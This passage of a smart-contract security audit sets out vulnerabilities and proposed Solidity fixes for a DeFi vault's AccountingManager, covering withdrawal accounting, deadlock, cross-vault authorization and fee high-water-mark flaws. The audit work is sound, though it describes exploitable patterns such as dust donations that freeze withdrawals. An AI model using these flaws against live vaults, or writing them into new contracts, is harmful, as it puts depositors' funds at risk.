```

Prevent `calculateWithdrawShares` from being called whenever a withdrawal group is active (`currentWithdrawGroup.isStarted == true`), even if it has been marked fulfilled, until all withdrawals in that group have been executed and `currentWithdrawGroup` has been deleted. Alternatively, preserve `currentWithdrawGroup.totalCBAmount` when deleting/resetting `currentWithdrawGroup` at the end of `executeWithdraw`.

**Preferred Fix in `AccountingManager.calculateWithdrawShares`:**

```solidity
    function calculateWithdrawShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
        uint256 middleTemp = withdrawQueue.middle;
        uint64 i = 0;
        uint256 processedShares = 0;
        uint256 assetsNeededForWithdraw = 0;
        uint256 oldestUpdateTime = TVLHelper.getLatestUpdateTime(vaultId, registry);

        if (currentWithdrawGroup.isStarted == true) {
            revert NoyaAccounting_ThereIsAnActiveWithdrawGroup();
        }
        while (
            withdrawQueue.last > middleTemp && withdrawQueue.queue[middleTemp].recordTime <= oldestUpdateTime
                && i < maxIterations
        ) {
            i += 1;
            WithdrawRequest storage data = withdrawQueue.queue[middleTemp];
            uint256 assets = previewRedeem(data.shares);
            data.amount = assets;
            data.calculationTime = block.timestamp;
            assetsNeededForWithdraw += assets;
            processedShares += data.shares;
            emit CalculateWithdraw(middleTemp, data.owner, data.receiver, data.shares, assets, block.timestamp);

            middleTemp += 1;
        }
        currentWithdrawGroup.totalCBAmount += assetsNeededForWithdraw;
        withdrawQueue.middle = middleTemp;
    }
```

Track and deduct previously calculated request amounts when resetting `withdrawQueue.middle` and/or when recalculating requests in `calculateWithdrawShares`. Specifically, in `calculateWithdrawShares`, subtract any prior `data.amount` before overwriting it, and in `resetMiddle`, clear and subtract the amounts of rolled-back requests from `currentWithdrawGroup.totalCBAmount`:

```solidity
    function calculateWithdrawShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
        uint256 middleTemp = withdrawQueue.middle;
        uint64 i = 0;
        uint256 processedShares = 0;
        uint256 assetsNeededForWithdraw = 0;
        uint256 previousAssets = 0;
        uint256 oldestUpdateTime = TVLHelper.getLatestUpdateTime(vaultId, registry);

        if (currentWithdrawGroup.isFullfilled == false && currentWithdrawGroup.isStarted == true) {
            revert NoyaAccounting_ThereIsAnActiveWithdrawGroup();
        }
        while (
            withdrawQueue.last > middleTemp && withdrawQueue.queue[middleTemp].recordTime <= oldestUpdateTime
                && i < maxIterations
        ) {
            i += 1;
            WithdrawRequest storage data = withdrawQueue.queue[middleTemp];
            uint256 assets = previewRedeem(data.shares);
            previousAssets += data.amount;
            data.amount = assets;
            data.calculationTime = block.timestamp;
            assetsNeededForWithdraw += assets;
            processedShares += data.shares;
            emit CalculateWithdraw(middleTemp, data.owner, data.receiver, data.shares, assets, block.timestamp);

            middleTemp += 1;
        }
        currentWithdrawGroup.totalCBAmount = currentWithdrawGroup.totalCBAmount + assetsNeededForWithdraw - previousAssets;
        withdrawQueue.middle = middleTemp;
    }
```

Additionally, in `resetMiddle` (when `depositOrWithdraw == false`), iterate from `newMiddle` to `withdrawQueue.middle` to subtract each request's `amount` from `currentWithdrawGroup.totalCBAmount` and reset `amount = 0` so that partial recalculations before `startCurrentWithdrawGroup()` cannot leave stale amounts in `currentWithdrawGroup.totalCBAmount`.

findings.technical_details:
`AccountingManager` inherits from OpenZeppelin's `ERC4626` and implements an asynchronous, multi-step withdrawal lifecycle:
1. Users queue withdrawal requests via `withdraw(uint256 share, address receiver)` (line 304), which records `data.shares` in `withdrawQueue` and increments `withdrawRequestsByAddress[msg.sender]` so the user cannot transfer those shares (enforced in `_update` at line 186).
2. The manager calls `calculateWithdrawShares(uint256 maxIterations)` (line 328) to price queued withdrawal requests:
   ```solidity
   uint256 assets = previewRedeem(data.shares);
   data.amount = assets;
   data.calculationTime = block.timestamp;
   assetsNeededForWithdraw += assets;
   processedShares += data.shares;
   ...
   currentWithdrawGroup.totalCBAmount += assetsNeededForWithdraw;
   withdrawQueue.middle = middleTemp;
   ```
3. The manager starts and fulfills the withdrawal group via `startCurrentWithdrawGroup()` (line 360) and `fulfillCurrentWithdrawGroup()` (line 370), and after `withdrawWaitingTime` (6 hours) has elapsed, executes the withdrawals via `executeWithdraw()` (line 396), where `_burn(data.owner, shares)` (line 419) and `baseToken.safeTransfer(data.receiver, baseTokenAmount)` (line 428) finally occur.

The flaw lies in the accounting gap between `calculateWithdrawShares` (lines 344–354) and `executeWithdraw` (line 419):
- At line 344, `previewRedeem(data.shares)` delegates to `ERC4626._convertToAssets`, which computes `shares * (totalAssets() + 1) / (totalSupply() + 1)`.
- Once `calculateWithdrawShares` sets `data.amount = assets` (line 345) and adds `assetsNeededForWithdraw` to `currentWithdrawGroup.totalCBAmount` (line 353), those withdrawal requests have a fixed `baseToken` liability.
- Although `calculateWithdrawShares` accumulates `processedShares += data.shares` at line 348 (and `IAccountingManager` documents `totalSharesWaitingForWithdraw` on `WithdrawQueue`), `processedShares` is never used: the shares are neither burned in `calculateWithdrawShares` nor subtracted from `totalSupply()`, and `currentWithdrawGroup.totalCBAmount` / `currentWithdrawGroup.totalABAmount` are not deducted from `totalAssets()` (unlike `depositQueue.totalAWFDeposit`).

Consequently, during the minimum 6-hour window (plus group fulfillment time) before `executeWithdraw` burns the shares and transfers out the `baseToken`, any change in vault TVL (profit or loss) is spread across the already-calculated withdrawal shares still in `totalSupply()`, while the fixed `baseToken` liability owed to calculated withdrawals remains inside `totalAssets()`. This causes subsequent calls to `previewRedeem` (in `calculateWithdrawShares`) and `previewDeposit` (in `calculateDepositShares`) to compute an incorrect share price.

findings.remediation:
Track the total calculated shares waiting for withdrawal execution (or burn shares upon calculation) and exclude both those calculated shares from the effective `totalSupply` and the calculated/fulfilled withdrawal liabilities (`currentWithdrawGroup.totalCBAmount` and `currentWithdrawGroup.totalABAmount`) from `totalAssets()`.

In `calculateWithdrawShares`, persist `processedShares` into storage (e.g., `withdrawQueue.totalSharesWaitingForWithdraw`):

```solidity
    function calculateWithdrawShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
        uint256 middleTemp = withdrawQueue.middle;
        uint64 i = 0;
        uint256 processedShares = 0;
        uint256 assetsNeededForWithdraw = 0;
        uint256 oldestUpdateTime = TVLHelper.getLatestUpdateTime(vaultId, registry);

        if (currentWithdrawGroup.isFullfilled == false && currentWithdrawGroup.isStarted == true) {
            revert NoyaAccounting_ThereIsAnActiveWithdrawGroup();
        }
        while (
            withdrawQueue.last > middleTemp && withdrawQueue.queue[middleTemp].recordTime <= oldestUpdateTime
                && i < maxIterations
        ) {
            i += 1;
            WithdrawRequest storage data = withdrawQueue.queue[middleTemp];
            uint256 assets = previewRedeem(data.shares);
            data.amount = assets;
            data.calculationTime = block.timestamp;
            assetsNeededForWithdraw += assets;
            processedShares += data.shares;
            currentWithdrawGroup.totalCBAmount += assets;
            withdrawQueue.totalSharesWaitingForWithdraw += data.shares;
            emit CalculateWithdraw(middleTemp, data.owner, data.receiver, data.shares, assets, block.timestamp);

            middleTemp += 1;
        }
        withdrawQueue.middle = middleTemp;
    }
```

Ensure `withdrawQueue.totalSharesWaitingForWithdraw` is subtracted from `totalSupply()` in `_convertToShares` / `_convertToAssets` (and decremented in `executeWithdraw` and `resetMiddle`), and subtract pending calculated/fulfilled withdrawal amounts (`currentWithdrawGroup.totalCBAmount + currentWithdrawGroup.totalABAmount`) from `totalAssets()`.

findings.technical_details:
The withdrawal lifecycle in `AccountingManager` processes queued withdrawal requests through `calculateWithdrawShares`, `startCurrentWithdrawGroup`, `retrieveTokensForWithdraw`, `fulfillCurrentWithdrawGroup`, and `executeWithdraw`.

When a withdrawal group is started via `startCurrentWithdrawGroup`, `currentWithdrawGroup.totalCBAmount` holds the total calculated base token amount owed to the group. To gather funds from connectors, the manager calls `retrieveTokensForWithdraw`:

```solidity
uint256 neededAssets = neededAssetsForWithdraw();
...
amountAskedForWithdraw += amountAskedForWithdraw_temp;
if (amountAskedForWithdraw_temp > neededAssets) {
    revert NoyaAccounting_INVALID_AMOUNT();
}
```

Here, `neededAssetsForWithdraw()` calculates the deficit between `currentWithdrawGroup.totalCBAmount` and the vault's currently available idle base tokens (`availableAssets`):

```solidity
uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
...
return currentWithdrawGroup.totalCBAmount - availableAssets;
```

When connectors experience slippage, withdrawal fees, or losses while redeeming underlying positions, `IConnector.sendTokensToTrustedAddress` transfers an actual `amount` smaller than `retrieveData[i].withdrawAmount`. Consequently, after retrieving funds from the connectors, `availableAssets` remains strictly less than `currentWithdrawGroup.totalCBAmount`, so `neededAssetsForWithdraw()` returns a non-zero value (`neededAssets != 0`).

`fulfillCurrentWithdrawGroup` attempts to handle this shortfall scenario (lines 380–384 set `currentWithdrawGroup.totalABAmount = availableAssets` when `availableAssets < currentWithdrawGroup.totalCBAmount`), but guards fulfillment with the following check on line 374:

```solidity
uint256 neededAssets = neededAssetsForWithdraw();

if (neededAssets != 0 && amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount) {
    revert NoyaAccounting_NOT_READY_TO_FULFILL();
}
```

This check violates withdrawal lifecycle consistency in two ways:

1. **Pre-existing `availableAssets > 0` in `AccountingManager`:**
   If `AccountingManager` holds any idle `baseToken` balance above `depositQueue.totalAWFDeposit` (even `1 wei` from uninvested funds, rounding leftovers, or a direct token transfer) before `retrieveTokensForWithdraw` is called, `neededAssetsForWithdraw()` returns `currentWithdrawGroup.totalCBAmount - availableAssets < currentWithdrawGroup.totalCBAmount`. Because `retrieveTokensForWithdraw` reverts with `NoyaAccounting_INVALID_AMOUNT()` if `amountAskedForWithdraw_temp > neededAssets`, the manager can request at most `currentWithdrawGroup.totalCBAmount - availableAssets`. If the connectors return any amount less than `withdrawAmount` due to slippage or loss, `neededAssets` remains non-zero while `amountAskedForWithdraw` is `currentWithdrawGroup.totalCBAmount - initialAvailableAssets < currentWithdrawGroup.totalCBAmount`. Calling `fulfillCurrentWithdrawGroup()` then reverts with `NoyaAccounting_NOT_READY_TO_FULFILL()`.

2. **Multi-step retrievals where `amountAskedForWithdraw` exceeds `totalCBAmount`:**
   If the manager calls `retrieveTokensForWithdraw` requesting `currentWithdrawGroup.totalCBAmount` from a connector that only partially fulfills the request (returning less than `withdrawAmount`), `neededAssetsForWithdraw()` remains non-zero. If the manager subsequently calls `retrieveTokensForWithdraw` on a second connector to cover the remaining `neededAssets` and suffers even `1 wei` of slippage, `amountAskedForWithdraw` becomes strictly greater than `currentWithdrawGroup.totalCBAmount` while `neededAssets != 0`. Because line 374 checks `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount` (strict inequality), `fulfillCurrentWithdrawGroup()` permanently reverts.

Because an active withdrawal group cannot be cancelled or restarted (`startCurrentWithdrawGroup` and `calculateWithdrawShares` both require the current withdrawal group to be fulfilled first), the entire withdrawal queue becomes permanently stuck unless external funds are donated to `AccountingManager` to force `neededAssets == 0`.

findings.remediation:
Account for the available assets and allow `amountAskedForWithdraw` to be greater than or equal to the required retrieval amount, or track the cumulative shortfall between requested `withdrawAmount` and actual received `amount`. Within `fulfillCurrentWithdrawGroup`, ensure the readiness condition does not use strict inequality against `currentWithdrawGroup.totalCBAmount` without accounting for `availableAssets`:

```solidity
    function fulfillCurrentWithdrawGroup() public onlyManager nonReentrant whenNotPaused {
        require(currentWithdrawGroup.isStarted == true && currentWithdrawGroup.isFullfilled == false);
        uint256 neededAssets = neededAssetsForWithdraw();
        uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;

        if (neededAssets != 0 && amountAskedForWithdraw < currentWithdrawGroup.totalCBAmount - availableAssets) {
            revert NoyaAccounting_NOT_READY_TO_FULFILL();
        }
        currentWithdrawGroup.isFullfilled = true;
        amountAskedForWithdraw = 0;
        if (availableAssets >= currentWithdrawGroup.totalCBAmount) {
            currentWithdrawGroup.totalABAmount = currentWithdrawGroup.totalCBAmount;
        } else {
            currentWithdrawGroup.totalABAmount = availableAssets;
        }
        currentWithdrawGroup.totalCBAmountFullfilled = currentWithdrawGroup.totalCBAmount;
        currentWithdrawGroup.totalCBAmount = 0;
        emit WithdrawGroupFulfilled(
            currentWithdrawGroup.lastId, currentWithdrawGroup.totalCBAmount, currentWithdrawGroup.totalABAmount
        );
    }
```

findings.technical_details:
`AccountingManager` inherits from `NoyaGovernanceBase` and restricts queue-management functions—specifically `resetMiddle(uint256 newMiddle, bool depositOrWithdraw)` (lines 453–469)—using the `onlyManager` modifier.

In `contracts/governance/NoyaGovernanceBase.sol` (lines 31–37), `onlyManager` is implemented as:

```solidity
modifier onlyManager() {
    (,,, address keeperContract,, address emergencyManager) = registry.getGovernanceAddresses(vaultId);
    if (!(msg.sender == keeperContract || msg.sender == emergencyManager || msg.sender == registry.flashLoan())) {
        revert NoyaGovernance_Unauthorized(msg.sender);
    }
    _;
}
```

In `contracts/accountingManager/Registry.sol` (line 28), `flashLoan` is a single global contract address stored on `PositionRegistry` and shared across all registered vaults, rather than a per-vault address. While `registry.flashLoan()` is included in `onlyManager` so that the flash-loan contract can invoke connector functions during flash-loan callbacks, `AccountingManager` uses the same `onlyManager` modifier for vault accounting and emergency queue reset operations (`resetMiddle`).

This creates two delegated authorization boundary flaws affecting `resetMiddle`:
1. **Confused-Deputy Access through Shared Executor (`registry.flashLoan()`)**: Because `registry.flashLoan()` is unconditionally trusted by `onlyManager` for every `vaultId`, any actor authorized to trigger callbacks through the shared `flashLoan` contract (such as a keeper for another vault `vaultId_B`) can instruct `flashLoan` to call `resetMiddle` on `AccountingManager` for `vaultId_A`. `AccountingManager` sees `msg.sender == registry.flashLoan()` and authorizes the call, leaking cross-vault manager privileges.
2. **Overly Broad Delegated Role for Anti-Manipulation Reset**: As documented on `resetMiddle` (lines 451–452), resetting the queue middle index is a protective intervention used in the event of price manipulation or erroneous share calculation. Granting this capability via `onlyManager` exposes queue resets to the routine execution path (`keeperContract` and the shared `registry.flashLoan()` executor) rather than restricting it to the vault's dedicated emergency/watcher roles (`onlyEmergencyOrWatcher`) or strictly vault-scoped emergency/keeper callers without `registry.flashLoan()`.

Once authorized, `resetMiddle` rolls `depositQueue.middle` or `withdrawQueue.middle` back to `newMiddle` (as low as `depositQueue.first` or `withdrawQueue.first`), forcing all previously calculated deposit or withdrawal requests in that range to await recalculation and resetting their waiting period before execution.

findings.remediation:
Do not authorize the shared `registry.flashLoan()` executor for `AccountingManager` queue management functions, and restrict `resetMiddle` to the vault-specific emergency/watcher or direct vault manager roles that cannot be invoked via the shared flash-loan contract.

In `contracts/accountingManager/AccountingManager.sol`:

```solidity
    function resetMiddle(uint256 newMiddle, bool depositOrWithdraw) public onlyEmergencyOrWatcher {
        if (depositOrWithdraw) {
            emit ResetMiddle(newMiddle, depositQueue.middle, depositOrWithdraw);

            if (newMiddle >= depositQueue.middle || newMiddle < depositQueue.first) {
                revert NoyaAccounting_INVALID_AMOUNT();
            }
            depositQueue.middle = newMiddle;
        } else {
            emit ResetMiddle(newMiddle, withdrawQueue.middle, depositOrWithdraw);

            if (newMiddle >= withdrawQueue.middle || newMiddle < withdrawQueue.first || currentWithdrawGroup.isStarted) {
                revert NoyaAccounting_INVALID_AMOUNT();
            }
            withdrawQueue.middle = newMiddle;
        }
    }
```

Additionally, in `contracts/governance/NoyaGovernanceBase.sol`, separate connector flash-loan authorization from `onlyManager` so `AccountingManager` administrative functions cannot be called by the shared `registry.flashLoan()` contract:

```solidity
    modifier onlyManager() {
        (,,, address keeperContract,, address emergencyManager) = registry.getGovernanceAddresses(vaultId);
        if (!(msg.sender == keeperContract || msg.sender == emergencyManager)) {
            revert NoyaGovernance_Unauthorized(msg.sender);
        }
        _;
    }
```

findings.technical_details:
The withdrawal process in `AccountingManager` follows a multi-step lifecycle using `withdrawQueue` (`first`, `middle`, `last`) and `currentWithdrawGroup`:

1. Users submit withdrawal requests via `withdraw`, which appends entries to `withdrawQueue` and increments `withdrawQueue.last`.
2. The manager calls `calculateWithdrawShares`, which iterates from `withdrawQueue.middle` up to `withdrawQueue.last` (while `currentWithdrawGroup.isStarted == false`). For each request at index `i`, it calculates the base token amount corresponding to the user's shares, stores it in `withdrawQueue.queue[i].amount`, sets `calculationTime`, and accumulates the calculated amount into `currentWithdrawGroup.totalCBAmount`. Finally, it advances `withdrawQueue.middle`.
3. If price manipulation or an oracle issue occurs prior to starting the withdraw group (`currentWithdrawGroup.isStarted == false`), the manager calls `resetMiddle(newMiddle, false)` (lines 461–468) to move `withdrawQueue.middle` back to `newMiddle` (`withdrawQueue.first <= newMiddle <= withdrawQueue.middle`).

However, in the `else` branch of `resetMiddle` (lines 461–468):

```solidity
} else {
    emit ResetMiddle(newMiddle, withdrawQueue.middle, depositOrWithdraw);

    if (newMiddle > withdrawQueue.middle || newMiddle < withdrawQueue.first || currentWithdrawGroup.isStarted) {
        revert NoyaAccounting_INVALID_AMOUNT();
    }
    withdrawQueue.middle = newMiddle;
}
```

The function only updates `withdrawQueue.middle = newMiddle` without deducting the previously calculated `withdrawQueue.queue[i].amount` values (for `newMiddle <= i < oldMiddle`) from `currentWithdrawGroup.totalCBAmount`.

When `calculateWithdrawShares` is subsequently called to recalculate the rolled-back withdrawal requests, it re-iterates from `newMiddle` and adds the newly calculated `amount` of each reprocessed request to `currentWithdrawGroup.totalCBAmount` again. Consequently, `currentWithdrawGroup.totalCBAmount` becomes inflated by the sum of the prior calculation amounts of all rolled-back requests.

findings.remediation:
When resetting `withdrawQueue.middle` to `newMiddle`, iterate through the rolled-back queue indices from `newMiddle` to the old `withdrawQueue.middle` and subtract each request's previously calculated `amount` from `currentWithdrawGroup.totalCBAmount` (and reset `amount` and `calculationTime` on the request).

```solidity
    function resetMiddle(uint256 newMiddle, bool depositOrWithdraw) public onlyManager {
        if (depositOrWithdraw) {
            emit ResetMiddle(newMiddle, depositQueue.middle, depositOrWithdraw);

            if (newMiddle > depositQueue.middle || newMiddle < depositQueue.first) {
                revert NoyaAccounting_INVALID_AMOUNT();
            }
            depositQueue.middle = newMiddle;
        } else {
            uint256 oldMiddle = withdrawQueue.middle;
            emit ResetMiddle(newMiddle, oldMiddle, depositOrWithdraw);

            if (newMiddle > oldMiddle || newMiddle < withdrawQueue.first || currentWithdrawGroup.isStarted) {
                revert NoyaAccounting_INVALID_AMOUNT();
            }
            for (uint256 i = newMiddle; i < oldMiddle; i++) {
                currentWithdrawGroup.totalCBAmount -= withdrawQueue.queue[i].amount;
                withdrawQueue.queue[i].amount = 0;
                withdrawQueue.queue[i].calculationTime = 0;
            }
            withdrawQueue.middle = newMiddle;
        }
    }
```

findings.technical_details:
The performance fee mechanism in `AccountingManager` relies on four coupled state variables to ensure fees are only collected on net new profits above the high-water mark (`totalProfitCalculated`) that persist for at least 12 hours (and are claimed within 48 hours):
- `storedProfitForFee`: The cached vault profit snapshot.
- `profitStoredTime`: The timestamp when the profit snapshot was taken.
- `preformanceFeeSharesWaitingForDistribution`: The pending fee shares calculated from `storedProfitForFee - totalProfitCalculated`.
- `totalProfitCalculated`: The high-water mark of vault profit for which performance fees have already been distributed.

To prevent a strategy manager from claiming performance fees if the vault's profit drops during the 12-hour lock period, `checkIfTVLHasDroped()` allows any external caller to reset `preformanceFeeSharesWaitingForDistribution = 0` and `profitStoredTime = 0` whenever `getProfit() < storedProfitForFee`.

However, `recordProfitForFee()` (lines 475–481) updates `storedProfitForFee` and `profitStoredTime` unconditionally before performing the early return check:

```solidity
function recordProfitForFee() public onlyManager nonReentrant {
    storedProfitForFee = getProfit();
    profitStoredTime = block.timestamp;

    if (storedProfitForFee < totalProfitCalculated) {
        return;
    }

    preformanceFeeSharesWaitingForDistribution =
        previewDeposit(((storedProfitForFee - totalProfitCalculated) * performanceFee) / FEE_PRECISION);
    ...
}
```

When `getProfit()` is less than `totalProfitCalculated` while `preformanceFeeSharesWaitingForDistribution > 0` (from a prior `recordProfitForFee()` call when profit was above `totalProfitCalculated`), calling `recordProfitForFee()` causes three state inconsistencies:
1. **Stale Pending Fee Shares Retained:** The function returns at line 480 without resetting `preformanceFeeSharesWaitingForDistribution` to `0`, leaving the previously computed fee shares intact despite the vault having lost its profit.
2. **Protection Bypass (`checkIfTVLHasDroped` Neutralized):** Because `storedProfitForFee` is overwritten with the new lower `getProfit()`, `checkIfTVLHasDroped()` evaluates `currentProfit < storedProfitForFee` as `false` and can no longer clear `preformanceFeeSharesWaitingForDistribution`. Additionally, `profitStoredTime` is reset to `block.timestamp`, which can also re-open an expired (> 48 hours) collection window.
3. **High-Water Mark Corruption:** Once 12 hours elapse from the updated `profitStoredTime`, calling `collectPerformanceFees()` mints the stale `preformanceFeeSharesWaitingForDistribution` to `performanceFeeReceiver` and executes `totalProfitCalculated = storedProfitForFee` (line 536). Because `storedProfitForFee < totalProfitCalculated`, this reduces the high-water mark `totalProfitCalculated`, allowing the vault manager to charge performance fees a second time when the vault recovers to its previous profit level.

findings.remediation:
Do not update `storedProfitForFee` or `profitStoredTime` when the current profit does not exceed `totalProfitCalculated` (or reset `preformanceFeeSharesWaitingForDistribution` and `profitStoredTime` when profit drops below `totalProfitCalculated`).

```solidity
    function recordProfitForFee() public onlyManager nonReentrant {
        uint256 currentProfit = getProfit();

        if (currentProfit <= totalProfitCalculated) {
            preformanceFeeSharesWaitingForDistribution = 0;
            profitStoredTime = 0;
            return;
        }

        storedProfitForFee = currentProfit;
        profitStoredTime = block.timestamp;

        preformanceFeeSharesWaitingForDistribution =
            previewDeposit(((storedProfitForFee - totalProfitCalculated) * performanceFee) / FEE_PRECISION);
        emit RecordProfit(
            storedProfitForFee, totalProfitCalculated, preformanceFeeSharesWaitingForDistribution, block.timestamp
        );
    }
```

findings.technical_details:
In `AccountingManager.sol`, the vault's total value locked (`TVL()`)—which also serves as `ERC4626.totalAssets()` and the basis for `getProfit()`—is calculated across two locations:

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

`TVLHelper.getTVL()` iterates through all active `HoldingPI` entries in `PositionRegistry` for `vaultId`, accumulating non-debt positions into `totalTVL` and debt positions (`registry.isPositionDebt(vaultId, positions[i].positionId) == true`) into `totalDebt`:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

Because `TVLHelper.getTVL()` returns an unsigned integer and floors the result at `0` whenever `totalTVL < totalDebt`, the vault's liabilities (`totalDebt`) are netted exclusively against assets held inside connectors (`totalTVL`) rather than against the entire vault's assets (which include `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` held in `AccountingManager`).

Whenever `totalDebt > totalTVL` in the connectors while `AccountingManager` holds idle `baseToken`—for instance, when a connector borrows funds (recording a debt position) and transfers `baseToken` to `AccountingManager` via `sendTokensToTrustedAddress` to service withdrawals, or when connector asset valuations fall below connector debt while `AccountingManager` holds `baseToken` reserves—`TVLHelper.getTVL()` truncates the net negative connector balance to `0`. `AccountingManager.TVL()` then adds `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` in full without deducting the remaining unpaid debt (`totalDebt - totalTVL`).

As a result, `AccountingManager.TVL()` overstates the true net assets of the vault by `min(totalDebt - totalTVL, baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit)`.

findings.remediation:
Net the vault's total debt against the combined assets of both the connectors and `AccountingManager` before clamping to zero. For example, have `TVLHelper.getTVL` return both `totalTVL` and `totalDebt` (or pass `AccountingManager`'s available `baseToken` balance into the netting calculation), and perform the zero-flooring in `AccountingManager.TVL()`:

```solidity
    function TVL() public view returns (uint256) {
        uint256 availableBase = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        (uint256 positionsTVL, uint256 positionsDebt) = TVLHelper.getTVLAndDebt(vaultId, registry, address(baseToken));
        if (positionsTVL + availableBase < positionsDebt) {
            return 0;
        }
        return positionsTVL + availableBase - positionsDebt;
    }
```

findings.technical_details:
In `AccountingManager`, user withdrawals are processed in batches through a `WithdrawGroup` lifecycle:
1. `calculateWithdrawShares()` calculates the base token liability for queued withdrawal requests and accumulates it in `currentWithdrawGroup.totalCBAmount`.
2. `startCurrentWithdrawGroup()` marks the group as active (`isStarted = true`, `isFullfilled = false`).
3. `retrieveTokensForWithdraw()` pulls base tokens from connectors to the `AccountingManager` contract and tracks the requested amounts in `amountAskedForWithdraw`.
4. `fulfillCurrentWithdrawGroup()` marks the withdrawal group as fulfilled so `executeWithdraw()` can distribute the available tokens.

The vulnerability lies in how `neededAssetsForWithdraw()` (lines 616–624) computes the assets needed for withdrawal and how `retrieveTokensForWithdraw()` and `fulfillCurrentWithdrawGroup()` rely on it:

```solidity
function neededAssetsForWithdraw() public view returns (uint256) {
    uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
    if (
        currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
            || availableAssets >= currentWithdrawGroup.totalCBAmount
    ) {
        return 0;
    }
    return currentWithdrawGroup.totalCBAmount - availableAssets;
}
```

In `fulfillCurrentWithdrawGroup()` (lines 372–376), fulfillment is gated by:

```solidity
uint256 neededAssets = neededAssetsForWithdraw();

if (neededAssets != 0 && amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount) {
    revert NoyaAccounting_NOT_READY_TO_FULFILL();
}
```

And in `retrieveTokensForWithdraw()` (lines 550, 569–572), each retrieval call is gated by:

```solidity
uint256 neededAssets = neededAssetsForWithdraw();
...
amountAskedForWithdraw += amountAskedForWithdraw_temp;
if (amountAskedForWithdraw_temp > neededAssets) {
    revert NoyaAccounting_INVALID_AMOUNT();
}
```

This creates a fundamental accounting mismatch whenever connectors deliver fewer tokens than `withdrawAmount` (e.g., due to swap slippage, underlying protocol withdrawal fees, or vault losses—the exact scenario `totalABAmount < totalCBAmount` in `fulfillCurrentWithdrawGroup()` is designed to handle):

1. **Pre-existing Idle Balance or Front-Run Donation (`availableAssets > 0`):**
   If `AccountingManager` holds any idle `baseToken` balance above `depositQueue.totalAWFDeposit` (either from normal vault operations, uninvested deposits, or a 1-wei direct token transfer by an attacker), `neededAssetsForWithdraw()` returns `currentWithdrawGroup.totalCBAmount - availableAssets < currentWithdrawGroup.totalCBAmount`.
   Because `retrieveTokensForWithdraw()` reverts if `amountAskedForWithdraw_temp > neededAssets`, the manager can at most request `totalCBAmount - availableAssets`. If the connector experiences any slippage (e.g., returning `totalCBAmount - availableAssets - d` where `d > 0`), the new `availableAssets` becomes `totalCBAmount - d` (so `neededAssetsForWithdraw()` returns `d`), while `amountAskedForWithdraw` is `totalCBAmount - availableAssets`.
   At this point:
   - `fulfillCurrentWithdrawGroup()` reverts because `neededAssets = d != 0` and `amountAskedForWithdraw != totalCBAmount`.
   - To make `amountAskedForWithdraw == totalCBAmount`, the manager would need to increase `amountAskedForWithdraw` by `availableAssets_initial`. However, `neededAssetsForWithdraw()` now only returns `d`. Whenever `d < availableAssets_initial` (or if a subsequent retrieval call also returns tokens that reduce `neededAssetsForWithdraw()`), the manager cannot even call `retrieveTokensForWithdraw()` for the difference because `amountAskedForWithdraw_temp > neededAssets` reverts with `NoyaAccounting_INVALID_AMOUNT()`.

2. **Multi-Batch Retrieval Desynchronization:**
   Because `neededAssetsForWithdraw()` subtracts realized `availableAssets` rather than `amountAskedForWithdraw`, if the manager calls `retrieveTokensForWithdraw()` across multiple transactions when connectors suffer losses, `neededAssetsForWithdraw()` remains larger than the remaining unrequested `totalCBAmount - amountAskedForWithdraw`. A subsequent `retrieveTokensForWithdraw()` call can push `amountAskedForWithdraw` strictly above `currentWithdrawGroup.totalCBAmount`. Once `amountAskedForWithdraw > currentWithdrawGroup.totalCBAmount` while `neededAssets != 0`, `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount` is permanently true and `fulfillCurrentWithdrawGroup()` can never succeed.

Because there is no function to reset `amountAskedForWithdraw` or cancel an active `currentWithdrawGroup`, the withdrawal queue is permanently deadlocked.

findings.remediation:
Update `neededAssetsForWithdraw()` to account for both the idle assets that were not fetched via `retrieveTokensForWithdraw()` and `amountAskedForWithdraw`, or track the unrequested withdrawal amount directly against `amountAskedForWithdraw` while accounting for pre-existing `availableAssets`. Alternatively, if `neededAssetsForWithdraw()` is intended to represent the remaining unrequested amount from connectors when `availableAssets` is already present, ensure `neededAssetsForWithdraw()` and `fulfillCurrentWithdrawGroup()` use a consistent invariant:

```solidity
    function neededAssetsForWithdraw() public view returns (uint256) {
        uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        if ( // check if the withdraw group is fullfilled
            currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
                || availableAssets >= currentWithdrawGroup.totalCBAmount
                || amountAskedForWithdraw >= currentWithdrawGroup.totalCBAmount
        ) {
            return 0;
        }
        return currentWithdrawGroup.totalCBAmount - Math.max(availableAssets, amountAskedForWithdraw);
    }
```

findings.technical_details:
In `AccountingManager.sol`, `TVL()` (lines 627–630) computes the vault's total value locked by calling `TVLHelper.getTVL(vaultId, registry, address(baseToken))`, which iterates through every holding position registered in `PositionRegistry` and queries `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)`.

For raw token holdings held by connectors (`positionTypeId == 0`), `AccountingManager` serves as the `calculatorConnector`. When `AccountingManager.getPositionTVL` (lines 632–640) evaluates such a position:

```solidity
function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
    PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
    if (p.positionTypeId == 0) {
        address token = abi.decode(p.data, (address));
        uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
        return _getValue(token, base, amount);
    }
    return 0;
}
```

